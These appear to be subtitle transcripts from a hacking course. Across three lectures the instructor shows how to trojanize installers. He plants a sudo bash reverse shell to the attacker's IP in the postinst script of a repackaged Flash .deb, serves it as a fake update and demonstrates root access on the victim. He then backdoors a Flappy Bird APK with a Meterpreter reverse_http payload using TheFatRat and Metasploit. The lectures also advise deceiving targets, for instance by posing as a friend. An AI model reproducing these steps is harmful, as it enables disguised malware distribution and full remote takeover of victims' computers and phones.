and once it's executed, it will send the the result that it produces to us by email.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,220  -->  00:00:07,000
So far, we've seen how to generate a number of different evil files that work with Linux.

2

00:00:07,000  -->  00:00:11,000
We've seen how to create backdoors, simple backdoors, Keyloggers,

3

00:00:11,260  -->  00:00:17,620
Credential Harvesters, download and execute scripts and we've seen how to use all of these from terminal

4

00:00:17,840  -->  00:00:22,180
and I said even though that they're running from terminal, they're still not very suspicious

5

00:00:22,180  -->  00:00:27,920
because Linux users are used to use the terminal and execute executables from there.

6

00:00:28,620  -->  00:00:34,660
Executables, actually don't work in Linux unless you change their permissions or run them from terminal,

7

00:00:34,800  -->  00:00:36,240
like the way we've seen before.

8

00:00:37,120  -->  00:00:43,560
What I want to show you today is a more convincing method to get the target person to run your evil file

9

00:00:44,020  -->  00:00:49,480
and we're gonna do this by embedding our evil code inside a 'deb' file.

10

00:00:50,120  -->  00:00:53,280
'Deb' files are installers in Linux computers

11

00:00:53,380  -->  00:00:58,020
and what they do, they allow the target person to install a program on their computer.

12

00:00:58,540  -->  00:01:00,360
They work by double-clicking them,

13

00:01:00,480  -->  00:01:02,280
they won't need to change the permissions

14

00:01:02,580  -->  00:01:05,040
and they run through a normal GUI installer,

15

00:01:05,200  -->  00:01:07,580
so they're less suspicious to the target person.

16

00:01:09,100  -->  00:01:12,800
Now to do this, the first thing that you want to do is find the program

17

00:01:13,100  -->  00:01:15,320
that you want to embed your evil code in.

18

00:01:16,320  -->  00:01:20,792
Now my target is a Ubuntu machine, so I'm going to look for Ubuntu programs.

19

00:01:21,220  -->  00:01:24,640
To do that, I'm just going to type Ubuntu packages in Google.

20

00:01:26,460  -->  00:01:30,720
I'm gonna go to the first URL, which is a website by Ubuntu.

21

00:01:31,460  -->  00:01:35,960
I'm gonna select the Ubuntu version that I'm gonna target which is 16.04

22

00:01:36,860  -->  00:01:40,880
and then I see a list of categories of different programs for Ubuntu.

23

00:01:41,640  -->  00:01:44,040
Now I want to download something for web,

24

00:01:44,280  -->  00:01:46,420
so I'm gonna go on Web Software.

25

00:01:48,040  -->  00:01:50,960
And I'm actually gonna look for a flash installer

26

00:01:51,280  -->  00:01:57,160
because it's really easy to send this as an update to tell the target person that there is an update,

27

00:01:57,300  -->  00:02:00,820
you can send it by email or use even a smarter method

28

00:02:00,900  -->  00:02:03,880
and show the person that there is an update for their software

29

00:02:04,040  -->  00:02:06,940
and we'll see that method later on in the delivery methods.

30

00:02:07,600  -->  00:02:12,220
For now, I just want to show you how to embed an evil code into this Flash installer.

31

00:02:12,740  -->  00:02:14,280
So, I'm going to look for a 'flash'.

32

00:02:16,520  -->  00:02:19,520
And as you can see here, I have a flashplugin-downloader,

33

00:02:20,300  -->  00:02:21,800
so I'm gonna click on that.

34

00:02:23,480  -->  00:02:25,300
And then I'm gonna scroll down

35

00:02:25,700  -->  00:02:28,260
and click on the package that I want to download.

36

00:02:28,940  -->  00:02:32,060
Then, I'm gonna click on this link right here to download it.

37

00:02:33,560  -->  00:02:36,760
It's showing me the downloader, I'm gonna put it in my Downloads

38

00:02:37,800  -->  00:02:40,240
and that's it, I have the package downloaded now.

39

00:02:41,080  -->  00:02:43,760
So, I'm gonna close my web browser because I don't need it.

40

00:02:44,000  -->  00:02:45,940
I'm gonna go to my File Manager

41

00:02:46,440  -->  00:02:48,620
and I'm already in my Downloads right here.

42

00:02:49,420  -->  00:02:53,440
And this is the package that we want to inject our evil code in.

43

00:02:54,960  -->  00:03:01,160
Before we can inject evil code or do anything, we need to extract the files out of this package

44

00:03:01,160  -->  00:03:05,400
because there is a number of files all stored into this one single file.

45

00:03:06,480  -->  00:03:11,900
To do that we're gonna use the terminal and the first thing we're going to do is navigate to Downloads.

46

00:03:14,020  -->  00:03:20,100
And then, we're gonna do 'dpkg -x' to extract data

47

00:03:20,480  -->  00:03:24,320
and then we're going to put the file name that we want to take the data out of it.

48

00:03:24,440  -->  00:03:26,760
So, the name of this package right here

49

00:03:27,280  -->  00:03:29,040
and for me, it's called 'flash'.

50

00:03:30,240  -->  00:03:32,480
I'm just going to put 'deb' to autocomplete.

51

00:03:33,880  -->  00:03:37,100
So, we're just doing 'dpkg -x',

52

00:03:37,320  -->  00:03:41,080
followed by the filename that we want to extract data out of

53

00:03:41,660  -->  00:03:44,980
and then I'm gonna put a directory to put the data in.

54

00:03:45,740  -->  00:03:49,300
And I'm gonna call this directory, let's call it 'flash-update'.

55

00:03:52,200  -->  00:03:55,860
And as you can see now, this generated a new directory for us

56

00:03:56,300  -->  00:04:01,160
and inside the-- this directory, there is files that's used by this package.

57

00:04:02,500  -->  00:04:06,680
Now, we also want to ex, extract some control files used in this package

58

00:04:06,920  -->  00:04:11,720
and to do that, we're going to use the 'ar' command and we're going to do '-x' as well.

59

00:04:12,140  -->  00:04:15,060
And then put the file name that we want to get data out of

60

00:04:15,380  -->  00:04:17,220
and again that's 'flashplugin',

61

00:04:17,220  -->  00:04:21,260
so I'm just gonna put 'flashplugin', put 'deb' to autocomplete

62

00:04:21,480  -->  00:04:22,700
and then hit Enter.

63

00:04:24,780  -->  00:04:27,740
And as you can see, this generated three more files

64

00:04:28,100  -->  00:04:30,060
that we have taken out of this file .

65

00:04:31,000  -->  00:04:35,320
Now the one that we're actually interested in, is the 'control' one right here.

66

00:04:35,960  -->  00:04:37,260
So, I'm going to double-click this

67

00:04:37,805  -->  00:04:41,060
and that's going to generate a 'control' directory for me here.

68

00:04:41,760  -->  00:04:46,120
Inside this directory, we have an important file called 'control'.

69

00:04:46,900  -->  00:04:53,060
Sometimes, you will see two files in here, you'd see 'control' and a file called 'postinst'.

70

00:04:53,380  -->  00:04:59,400
For me there is no 'postinst', so I'm going to make it myself in a minute, but there is only a control file

71

00:04:59,400  -->  00:05:02,060
so I'm just going to copy the control file right now.

72

00:05:02,440  -->  00:05:05,160
If you had a 'postinst', you can copy it as well.

73

00:05:07,800  -->  00:05:10,300
Once we do this, I'm gonna go back to Downloads

74

00:05:11,720  -->  00:05:14,260
and go to my 'flash-update' directory.

75

00:05:15,940  -->  00:05:21,840
And in here, you might see more or less directories, depending on the package that you are using.

76

00:05:22,380  -->  00:05:24,860
In my case there is only one, it doesn't really matter.

77

00:05:25,280  -->  00:05:27,940
What I want to do is, I want to create a new directory.

78

00:05:30,160  -->  00:05:32,280
And call this directory DEBIAN.

79

00:05:34,620  -->  00:05:36,660
Now, I'm going to go inside this new directory

80

00:05:38,000  -->  00:05:40,740
and paste the 'control' file in here.

81

00:05:42,920  -->  00:05:45,740
Now like I said, if there was a 'postinst' file ,

82

00:05:45,920  -->  00:05:47,700
copy that as well and bring it here.

83

00:05:47,880  -->  00:05:51,180
If there wasn't, then just copy the 'control' like I did now.

84

00:05:51,720  -->  00:05:56,040
Basically, the control file just contains information about this package.

85

00:05:56,780  -->  00:05:59,620
The 'postinst', the one that I don't have right now,

86

00:05:59,960  -->  00:06:03,320
will be executed, once the package is installed

87

00:06:03,400  -->  00:06:08,320
and that's really important because that's the best place to embed evil code.

88

00:06:09,220  -->  00:06:12,040
So since I didn't have one, I'm gonna create it

89

00:06:12,160  -->  00:06:16,940
but if you had one, you can open it, delete everything in it and then put the evil code

90

00:06:17,180  -->  00:06:22,120
or you can just add the evil code within the lo-- the code that's already there.

91

00:06:22,680  -->  00:06:25,600
Again for me, I don't have that, so I'm gonna create it.

92

00:06:26,680  -->  00:06:30,840
To do that, I'm gonna run a text editor, so I'm just going to type in 'Leafpad'

93

00:06:31,320  -->  00:06:33,240
and put the 'ampersand (&amp;)' to open it.

94

00:06:35,600  -->  00:06:38,140
And in here, I'm gonna put my evil code.

95

00:06:39,060  -->  00:06:42,620
Now the code that you can use in here, can be Bash code.

96

00:06:42,920  -->  00:06:48,160
So basically, you can run any command that can run in the terminal in here.

97

00:06:49,760  -->  00:06:54,200
This means you have a lot of flexibility and you can pretty much do anything you want,

98

00:06:54,260  -->  00:06:57,080
you can use the 'wget' commands that we've seen before,

99

00:06:57,080  -->  00:07:02,200
so 'wget', 'chmod' and then execute the same way that we've seen in the previous videos.

100

00:07:02,600  -->  00:07:05,540
You can also use the 'download' and 'report' commands,

101

00:07:05,740  -->  00:07:10,600
you can use Python code in here and just pipe it, the same way that Empire does,

102

00:07:10,720  -->  00:07:16,200
you can copy the code generated by Empire, put it in here and it's going to get executed.

103

00:07:16,340  -->  00:07:17,660
You can do a lot of things.

104

00:07:17,760  -->  00:07:19,820
You can have a file in here

105

00:07:20,420  -->  00:07:24,640
and just call it from within this text in here, from this text editor.

106

00:07:25,160  -->  00:07:31,200
The only problem is, this is gonna run from within 'Debian' from within the package manager.

107

00:07:31,360  -->  00:07:36,780
And sometimes if you have complicated code in here, with a lot of environment variables,

108

00:07:37,040  -->  00:07:39,760
the code will break and it's just not going to work.

109

00:07:40,100  -->  00:07:42,520
Some package managers will be able to handle it,

110

00:07:42,700  -->  00:07:44,260
some of them will just get confused.

111

00:07:44,807  -->  00:07:49,020
So, to avoid that and to make sure that our code is going to get executed,

112

00:07:49,180  -->  00:07:51,900
I prefer to use the simplest code that I know

113

00:07:52,200  -->  00:07:56,040
and that's the very simple one-line bash command that I showed you before

114

00:07:56,340  -->  00:07:57,820
that give us a reverse connection.

115

00:07:58,200  -->  00:07:59,260
So, I'm going to use that

116

00:07:59,440  -->  00:08:02,940
and then once I get the connection, I can do anything else that I want.

117

00:08:03,560  -->  00:08:04,920
So I'm going to type in the code

118

00:08:05,220  -->  00:08:10,360
and we're gonna start with the 'Shebang (#!)' and then we're gonna do '/bin/bash'.

119

00:08:12,540  -->  00:08:16,820
We have to put this at the top of the file because this is going to be a Bash file

120

00:08:17,160  -->  00:08:19,240
and then you can put any code that you want.

121

00:08:19,360  -->  00:08:23,820
And like I said, I'm gonna use the very simple one-line bash command that we seen before

122

00:08:24,120  -->  00:08:25,700
that give us a reverse connection.

123

00:08:26,000  -->  00:08:30,860
And that was 'bash -i dev/tcp/', my IP address

124

00:08:30,920  -->  00:08:33,420
and then the port that I want to receive the connection on.

125

00:08:35,620  -->  00:08:38,000
Now we spoke about this code, we've seen it in action,

126

00:08:38,000  -->  00:08:40,780
we've seen how to use it and I spoke about all these parts.

127

00:08:41,160  -->  00:08:44,200
So basically, you need your, the IP of the Kali machine here,

128

00:08:44,443  -->  00:08:45,520
followed by the port

129

00:08:45,840  -->  00:08:50,520
and that'll basically, give you a reverse connection from the target computer to you.

130

00:08:50,980  -->  00:08:52,680
If you don't remember how to use that,

131

00:08:52,880  -->  00:08:53,600
then go back

132

00:08:54,120  -->  00:08:58,080
and revise the lecture on the 'basic reverse shell' command.

133

00:08:58,560  -->  00:08:59,840
Now, this is perfect.

134

00:09:00,240  -->  00:09:05,920
And we can actually add one more thing to this code, to give us root access.

135

00:09:06,300  -->  00:09:11,100
Basically, Linux users are used to put their password when installing new programs.

136

00:09:11,360  -->  00:09:14,540
Like in general, whenever they're installing something,

137

00:09:14,780  -->  00:09:18,960
the system will not allow them to install anything without putting their password.

138

00:09:19,460  -->  00:09:24,720
Since they're gonna put the password for the root, for the admin, we can just put 'sudo' before the command

139

00:09:25,080  -->  00:09:27,540
and that will give us access to that computer

140

00:09:27,660  -->  00:09:29,560
but it's going to give us root access.

141

00:09:29,700  -->  00:09:31,800
It's gonna give us administrator access

142

00:09:32,260  -->  00:09:35,100
that's because the person is gonna enter their password

143

00:09:35,280  -->  00:09:39,720
and they're used to enter their password because they can't install programs without putting their password.

144

00:09:40,520  -->  00:09:43,420
Now this is done. This is perfect. We have our code here.

145

00:09:43,620  -->  00:09:44,900
I'm gonna save this.

146

00:09:45,200  -->  00:09:48,140
And we're gonna save it in Downloads,

147

00:09:48,880  -->  00:09:50,160
flash-update,

148

00:09:51,160  -->  00:09:52,260
'Debian'

149

00:09:52,920  -->  00:09:54,960
and we're going to call this 'postinst'.

150

00:09:57,060  -->  00:10:02,700
And like I said, if there was a 'postinst', you can literally just copy this line and paste it anywhere in that file.

151

00:10:03,180  -->  00:10:06,380
If there wasn't, you can delete, you can just create one yourself.

152

00:10:07,180  -->  00:10:09,620
And again you can put any bash code in here.

153

00:10:09,900  -->  00:10:14,840
So, you can use all the download and execute codes and all the backdoors that we seen before,

154

00:10:15,060  -->  00:10:17,380
just paste their code here and they're gonna work.

155

00:10:17,860  -->  00:10:19,900
Now we're done with everything.

156

00:10:20,160  -->  00:10:21,400
I'm gonna close this.

157

00:10:21,620  -->  00:10:24,083
And the last thing that we want to do,

158

00:10:24,083  -->  00:10:28,920
is change the permissions of this file to make sure that it's an executable.

159

00:10:30,260  -->  00:10:34,860
To do that, I'm going to navigate to 'flash- update/'

160

00:10:36,300  -->  00:10:37,960
followed by 'Debian/'

161

00:10:39,740  -->  00:10:41,400
Now if we list,

162

00:10:42,480  -->  00:10:45,080
you'll see we have our 'postinst' file, right here.

163

00:10:45,940  -->  00:10:48,660
So, we're going to do 'chmod' to change the permissions.

164

00:10:49,880  -->  00:10:52,600
And we're going to change them to 755,

165

00:10:53,140  -->  00:10:54,620
to make it an executable

166

00:10:54,900  -->  00:10:59,080
and then the file that we want to change its permissions is called 'postinst'.

167

00:11:01,140  -->  00:11:02,040
Hit Enter.

168

00:11:03,320  -->  00:11:04,800
And if we do 'ls',

169

00:11:05,220  -->  00:11:10,280
you can see that the file is green, now it has executable permissions.

170

00:11:10,880  -->  00:11:11,840
Now we're done.

171

00:11:12,620  -->  00:11:16,220
I know, it sounds like it's a lot of work and it
sounds like it's complicated

172

00:11:16,580  -->  00:11:17,540
but it's actually not.

173

00:11:17,960  -->  00:11:21,100
And I'm gonna walk you through with, it's just that, it's just a bit tedious

174

00:11:21,280  -->  00:11:23,880
and you want to make sure, you do everything precisely.

175

00:11:24,520  -->  00:11:29,480
The first thing we did is we downloaded the package that we want to embed our evil code in.

176

00:11:30,120  -->  00:11:36,420
Then we uncompressed this package using the 'dpkg' command and using the 'ar' command.

177

00:11:36,500  -->  00:11:42,180
The 'dpkg' command resulted, extracted the data in 'flash-update'

178

00:11:43,040  -->  00:11:48,280
and then the 'ar' command extracted the 'control' file in here for us,

179

00:11:48,540  -->  00:11:52,220
which we double-clicked to generate
this 'control' directory.

180

00:11:53,520  -->  00:11:56,260
In here, we have our control file

181

00:11:56,540  -->  00:11:59,860
and I said, if you had a 'postinst' as well, copy both of them.

182

00:12:00,480  -->  00:12:03,100
go back, go to flash-update,

183

00:12:03,300  -->  00:12:04,240
go to DEBIAN

184

00:12:04,520  -->  00:12:06,260
and post the two files in here.

185

00:12:07,700  -->  00:12:11,380
Once you have the two files in here, you wanna open the 'postinst'

186

00:12:11,520  -->  00:12:15,400
and if there was no 'postinst', then you can create one,

187

00:12:15,740  -->  00:12:20,840
put the evil code that you want to use there and I said, you can use any bash script or command that you want,

188

00:12:21,200  -->  00:12:22,200
save that,

189

00:12:22,640  -->  00:12:25,300
change its permissions to executable

190

00:12:25,600  -->  00:12:26,440
and that's it.

191

00:12:26,580  -->  00:12:27,540
You're good to go.

192

00:12:27,780  -->  00:12:28,640
It's really simple.

193

00:12:29,260  -->  00:12:34,180
Now in the next lecture, I'll show you how we can package everything and generate a new DEB file,

194

00:12:34,420  -->  00:12:36,580
send that file to the target and test it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,420  -->  00:00:05,480
Okay, now that we configured our package, all we have to do is just put everything together

2

00:00:05,520  -->  00:00:08,820
into a single deb file and send it to the target person.

3

00:00:09,760  -->  00:00:15,340
So I'm gonna do CD, dot, dot, dot, dot, to go back twice

4

00:00:16,040  -->  00:00:20,320
and now if I do 'ls' I have my flash update directory,

5

00:00:20,320  -->  00:00:24,160
which contains all the packages and stuff that we need to package.

6

00:00:24,460  -->  00:00:29,280
To package this, we're gonna use 'dpkg-deb'

7

00:00:30,260  -->  00:00:32,820
and we're gonna tell it that I want you to build me something

8

00:00:34,900  -->  00:00:39,420
and the thing that I want you to build is stored in flash-update.

9

00:00:41,860  -->  00:00:47,520
So the package-deb is the command that or the program that we're going to use to package everything.

10

00:00:48,160  -->  00:00:50,440
We're telling it that we want, I want you to build me something

11

00:00:50,880  -->  00:00:54,500
and the thing that I want you to build me is stored in flash-update.

12

00:00:55,280  -->  00:01:01,300
Hit Enter and that's gonna create a Debian file, for us called flash-update.deb.

13

00:01:01,760  -->  00:01:07,520
So if I do 'ls', you'll see I have my Debian in here, my deb file

14

00:01:08,000  -->  00:01:10,940
and this is the file that I'm gonna send to my target.

15

00:01:11,620  -->  00:01:18,760
So I'm gonna do 'cp' to copy this and I'm gonna put it in my 'var/www/html/evil-files'.

16

00:01:18,800  -->  00:01:22,240
Like I've been always doing and that's it.

17

00:01:22,360  -->  00:01:24,900
Now the target can download this and run it

18

00:01:25,040  -->  00:01:28,860
and once they execute, it I'll get reverse
connection from them.

19

00:01:29,800  -->  00:01:35,160
In order to be able to communicate with that reverse connection, I'm gonna listen on port 8080

20

00:01:35,320  -->  00:01:37,680
because that's the port I used in my command.

21

00:01:38,200  -->  00:01:45,160
Now, again I showed how to use this in the basic reverse shell lecture that I covered before.

22

00:01:45,440  -->  00:01:47,380
So I'm just gonna do this a little bit quickly.

23

00:01:48,640  -->  00:01:51,460
Basically this command will listen on port 8080.

24

00:01:52,320  -->  00:01:58,100
Now, we go to our Ubuntu machine and I'm gonna download the file.

25

00:01:58,580  -->  00:02:05,120
So we're gonna go to http,10.2014.2013, evil-files

26

00:02:06,080  -->  00:02:08,440
and then the name of the file is flash update.

27

00:02:13,400  -->  00:02:17,440
Now, I've actually copied this to var/www/ html.

28

00:02:17,960  -->  00:02:19,460
So I'm just going to fix that.

29

00:02:20,520  -->  00:02:22,040
I'm gonna put it in my evil-files.

30

00:02:25,280  -->  00:02:27,560
And then listen on incoming connections.

31

00:02:28,440  -->  00:02:31,940
So I should be able to download it now from my evil-files directory.

32

00:02:33,860  -->  00:02:34,880
I'm gonna save it.

33

00:02:37,160  -->  00:02:38,520
Go to my File Manager,

34

00:02:40,100  -->  00:02:43,980
go to downloads and I have my flash update here .

35

00:02:44,820  -->  00:02:46,640
So I'm gonna double click it

36

00:02:49,300  -->  00:02:53,954
and as you can see now, you get a window telling you, giving you information about this package.

37

00:02:54,460  -->  00:02:56,500
It's called Flash plugin downloader.

38

00:02:56,960  -->  00:03:01,220
It's made by Adobe Flash Player and you have the description here saying

39

00:03:01,220  -->  00:03:03,840
it's Adobe Flash Player plugin installer.

40

00:03:04,580  -->  00:03:08,456
You have the website, if we click on the website you're gonna go to Flash Player.

41

00:03:08,456  -->  00:03:09,495
So it's all nice.

42

00:03:09,495  -->  00:03:10,962
It all looks legitimate.

43

00:03:10,962  -->  00:03:12,400
Nothing looks suspicious.

44

00:03:12,400  -->  00:03:13,820
You click on install.

45

00:03:15,200  -->  00:03:16,840
It's gonna ask you for the password

46

00:03:17,120  -->  00:03:21,840
but again Linux users are used to put their password where install, when installing stuff.

47

00:03:22,300  -->  00:03:24,240
So that's not suspicious at all.

48

00:03:26,040  -->  00:03:27,680
Put the password hit Enter.

49

00:03:28,180  -->  00:03:35,600
Go to the Machine and as you can see we have root access on Zaid VirtualBox on the Ubuntu machine.

50

00:03:36,320  -->  00:03:39,640
Now, I can run any command I want on the target computer

51

00:03:40,360  -->  00:03:43,500
and when I say any command, I mean any command

52

00:03:43,500  -->  00:03:48,900
because I'm root, I'm the most, I'm the user with the highest privileges on the system.

53

00:03:49,180  -->  00:03:51,940
So I can literally do anything I want on the system

54

00:03:52,240  -->  00:03:55,520
and there is nothing that can prevent me from doing anything.

55

00:03:55,980  -->  00:04:04,940
So if I do 'whoamI' you can see that I am root and I can run now any bash commands that I want.

56

00:04:05,060  -->  00:04:09,080
So we can do the 'wget' command that we seen before to download stuff,

57

00:04:09,500  -->  00:04:12,840
We can change permission and then execute it by dot forward slash.

58

00:04:13,840  -->  00:04:17,240
So we can download our backdoors we can download our Keyloggers.

59

00:04:17,240  -->  00:04:20,140
We can literally do anything that we want on the system

60

00:04:20,140  -->  00:04:23,991
and we'll talk more about the post exploitation part in the future.

61

00:04:24,440  -->  00:04:29,298
For now, you can see we managed to gain full control over a Linux machine

62

00:04:29,760  -->  00:04:31,560
using a legitimate Debian package.

63

00:04:32,040  -->  00:04:34,680
Now we can do this with any Debian package that you want

64

00:04:35,000  -->  00:04:37,440
depends on how you want to social engineer your target

65

00:04:38,140  -->  00:04:41,140
and you can use any command inside the postinst file.

66

00:04:41,540  -->  00:04:47,380
I picked the Flash plugin because I think it's a good package to social engineer the target

67

00:04:47,540  -->  00:04:53,260
and tell them that there is and you update or this is a special version or something like that

68

00:04:53,660  -->  00:04:57,000
and will see a smart way of delivering fake updates in the future.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,340  -->  00:00:06,140
In this video, I'd like to show you how to embed evil code into Android apps.

2

00:00:06,240  -->  00:00:12,880
So that when the app is executed on an Android device, the user will see a normal app or normal game

3

00:00:12,880  -->  00:00:17,480
that they can use but at the same time our backdoor will run at the background

4

00:00:17,660  -->  00:00:22,820
and will have full control over that Android device, whether it's a phone, a tablet

5

00:00:22,920  -->  00:00:24,660
or anything that runs Android.

6

00:00:25,240  -->  00:00:30,480
Now doing this is actually not very hard and the first step is you want to go

7

00:00:30,480  -->  00:00:34,700
and download the application that you want the target person to see,

8

00:00:34,880  -->  00:00:38,340
so you want to social engineer them to install that application.

9

00:00:38,540  -->  00:00:44,260
You can use any application you want, so you can just use an application for a restaurant, for example,

10

00:00:44,400  -->  00:00:48,420
and then social engineer your target to install that app to get a certain offer

11

00:00:48,880  -->  00:00:53,340
or you can just backdoor a game and then pretend to be the target person's friend

12

00:00:53,500  -->  00:00:57,040
and send them that game saying, "Oh, look at my new app or new game."

13

00:00:57,820  -->  00:01:02,320
I'm going to go to this website which is called apkmirror.com to download my apk.

14

00:01:02,400  -->  00:01:06,240
Now there's a lot of websites that allow you to do that, but I choose to use this one

15

00:01:06,720  -->  00:01:10,760
and I'm gonna look for a very simple game called Flappy Bird and you've probably heard of it.

16

00:01:14,240  -->  00:01:17,280
You can see I have the game in here, I'm gonna click on it

17

00:01:18,180  -->  00:01:21,480
and then I'm gonna scroll down and download the apk.

18

00:01:26,100  -->  00:01:29,580
I'm going to click OK to save it and that's it it's saved for me.

19

00:01:29,880  -->  00:01:31,800
So, I'm gonna close this

20

00:01:33,140  -->  00:01:39,900
and if I go to my files, you'll see I'm in my Downloads already and I can see the file right here.

21

00:01:40,460  -->  00:01:45,080
Now I'm going to rename this and I'm just gonna call it 'flappy bird'.

22

00:01:47,060  -->  00:01:48,440
Okay, now this is all good.

23

00:01:49,260  -->  00:01:52,000
Now we can go ahead and generate our backdoor.

24

00:01:53,480  -->  00:01:58,500
We can use TheFatRat to do that and we seen how to install and use TheFatRat before,

25

00:01:58,920  -->  00:02:04,860
but before I do that you need to configure Kali to use Java 8 by default

26

00:02:05,460  -->  00:02:10,420
because by default Kali will use the latest version of Java available

27

00:02:10,660  -->  00:02:17,080
and the latest version cannot be used to recompile the backdoor that we're going to create.

28

00:02:17,900  -->  00:02:25,460
So to change the default version of Java used by Kali you need to type 'update alternatives'

29

00:02:25,960  -->  00:02:30,980
and we're going to say I want to 'config' the 'java' version,

30

00:02:31,640  -->  00:02:32,780
so I'm gonna hit Enter

31

00:02:33,900  -->  00:02:38,900
and as you can see it can list all the Java versions available in Kali Linux

32

00:02:39,460  -->  00:02:46,280
and as you can see we have a star beside the auto mode which we'll choose Java 10 by default.

33

00:02:48,400  -->  00:02:55,300
So what I want to do is I'm going to enter number two to set Kali to use Java 8 by default.

34

00:02:55,960  -->  00:02:59,780
So, all we're gonna do is just enter number 2 and hit Enter.

35

00:03:00,880  -->  00:03:03,980
This will configure Kali to use Java 8 by default

36

00:03:04,100  -->  00:03:10,000
and this way we'll be able to use Kali to decompile the existing apk that we just downloaded

37

00:03:10,220  -->  00:03:15,740
and then inject a backdoor into it and recompile it to an 'apk' again.

38

00:03:17,000  -->  00:03:20,200
Now TheFatRat is going to do all of this for us, like I said.

39

00:03:20,580  -->  00:03:27,460
So, I'm going to navigate to the directory where I have it installed, which is an opt, TheFatRat

40

00:03:29,000  -->  00:03:33,440
and then we're gonna run it as usual by doing ./fatrat.

41

00:03:38,300  -->  00:03:43,700
Now, I want to generate an Android backdoor, so that's going to be number five here

42

00:03:45,880  -->  00:03:51,980
and the first thing it's asking me for my IP address as you can see it's automatically suggesting

43

00:03:51,980  -->  00:03:54,720
that my IP address is this, which is correct.

44

00:03:55,140  -->  00:04:00,560
If you're not sure about your IP address, you can split the screen, run 'ifconfig' and see the IP

45

00:04:00,660  -->  00:04:01,940
and we've seen this before.

46

00:04:02,600  -->  00:04:08,020
And you can probably notice that my IP right now is different than the NAT network IP.

47

00:04:08,400  -->  00:04:15,220
This is because I'm going to be targeting an android device connected to my Wi-Fi network.

48

00:04:15,740  -->  00:04:23,520
Therefore, I set my network settings, so if we go here, go to devices go to network

49

00:04:23,520  -->  00:04:30,540
and click on network settings, you'll see I have the network settings set to use a bridged adapter.

50

00:04:31,160  -->  00:04:37,340
So, basically what I have right now is my host machine and my target Android device

51

00:04:37,340  -->  00:04:45,020
connected both the same Wi-Fi network and this virtual machine Kali is said to use a bridged adapter.

52

00:04:45,020  -->  00:04:50,680
That's why it's getting an IP that is within the subnet of the Wi-Fi network

53

00:04:50,680  -->  00:04:56,160
and this way I'll be able to hack any computer connected to my Wi-Fi network.

54

00:04:57,360  -->  00:05:01,200
Now, you can also run this attack and all the other attacks that you seen so far

55

00:05:01,200  -->  00:05:04,140
on computers connected  to different networks,

56

00:05:04,560  -->  00:05:07,240
but we're going to talk about that later on in the course.

57

00:05:07,440  -->  00:05:12,520
For now, we're just gonna focus on hacking computers connected to the same network

58

00:05:12,520  -->  00:05:14,140
or to the NAT network.

59

00:05:15,320  -->  00:05:20,700
So I'm gonna put the IP as shown in here, which is 192.168.0.38,

60

00:05:22,380  -->  00:05:28,680
then it's asking me for the port that I want to use on my payload and I'm gonna set this to '8080'.

61

00:05:30,080  -->  00:05:33,860
Now, it's asking me for the app or the game that I want to backdoor

62

00:05:34,300  -->  00:05:41,000
and as we seen before this is in my Downloads and it's called flappybird.apk

63

00:05:42,540  -->  00:05:48,420
So we're gonna set the path root/Downloads/flappybird.apk.

64

00:05:49,380  -->  00:05:54,660
I'm gonna hit Enter and it's going to ask me what payload do I want to use,

65

00:05:55,040  -->  00:06:00,380
we're going to use android/meterpreter/reverse_http, so I'm gonna put number 1,

66

00:06:02,660  -->  00:06:07,780
then it's gonna ask me for the method that it should use to backdoor the apk

67

00:06:08,020  -->  00:06:10,980
and we're going to use number one for the latest method

68

00:06:11,720  -->  00:06:17,780
and now TheFatRat is going to first of all create an 'apk' backdoor, decompile the app,

69

00:06:17,860  -->  00:06:24,520
decompile the backdoor, inject the app into the backdoor, sign the new backdoored app

70

00:06:24,520  -->  00:06:30,520
and then generate an apk that when executed it'll run the apps that we selected,

71

00:06:30,800  -->  00:06:35,380
but at the same time it'll run our backdoor in the background.

72

00:06:36,640  -->  00:06:42,500
So now the backdoor is generated and as you can see it's giving us the path where the backdoor is stored.

73

00:06:43,300  -->  00:06:48,080
So I'm gonna copy this and then it's asking me if I want to start the listener

74

00:06:48,360  -->  00:06:51,140
and I'm gonna say no because I'm gonna do this manually.

75

00:06:52,080  -->  00:06:53,140
So, that's it we're done.

76

00:06:53,140  -->  00:06:58,420
I'm gonna hit Enter and I'm gonna enter '17' to exit TheFatRat.

77

00:07:00,500  -->  00:07:07,400
Now, I want to copy the backdoor that we just generated to my evil files directory,

78

00:07:07,560  -->  00:07:12,840
but I also want to rename it so we know we can use the 'cp' command to copy,

79

00:07:13,240  -->  00:07:19,080
but we can use the 'mv' command to move, so we're going to move a file to another place

80

00:07:19,080  -->  00:07:20,980
and rename it in the process.

81

00:07:21,520  -->  00:07:28,940
So the file that I want to move is stored in here and it's called app_backdoor.apk

82

00:07:29,640  -->  00:07:37,660
and first of all I want to move this to my var/www/html/evil-files

83

00:07:37,660  -->  00:07:41,740
and I want to call it flappybird.apk.

84

00:07:43,240  -->  00:07:47,580
So, the syntax of this command is very similar to the 'cp' command.

85

00:07:47,980  -->  00:07:51,180
First, you give it the file that you want to move

86

00:07:51,180  -->  00:07:58,200
and second you give it the location where you want to move the file to, follow it by the new file name.

87

00:07:58,620  -->  00:08:07,040
So now when I move this file the app_backdoor.apk, when it goes into my var/www/evil-files,

88

00:08:07,180  -->  00:08:11,340
it'll actually be renamed to flappybird.apk.

89

00:08:12,800  -->  00:08:18,700
So I'm gonna hit Enter and that's moved there and now we're ready to go and test the backdoor,

90

00:08:19,280  -->  00:08:23,253
but before we run it as you know, because we're using a reverse connection,

91

00:08:23,260  -->  00:08:27,680
we need to listen for incoming connections and I spent a full lecture

92

00:08:27,680  -->  00:08:31,440
showing you how to do that using Meatasploit's multi handler.

93

00:08:31,540  -->  00:08:35,100
So, first I'm gonna do 'msfconsole' to run Metasploit

94

00:08:36,440  -->  00:08:40,280
and I've already configured my handler to use the right options.

95

00:08:40,280  -->  00:08:42,341
If you don't remember how to do this,

96

00:08:42,341  -->  00:08:46,140
please go back and refer to the lecture where I show how to use it.

97

00:08:47,000  -->  00:08:51,280
So, right now I'm only gonna do show options to show you the right options,

98

00:08:51,880  -->  00:08:57,560
so like we did before you can see that I'm using an exploit multi handler to listen for incoming connections

99

00:08:57,860  -->  00:09:03,280
and I set my payload to android/meterpreter/reverse_http,

100

00:09:03,280  -->  00:09:06,360
the same payload that I picked when I generated the back door

101

00:09:06,460  -->  00:09:11,680
and this is always the same idea, we always pick in the handler the same payload that we pick

102

00:09:11,820  -->  00:09:13,400
when we generate the back door.

103

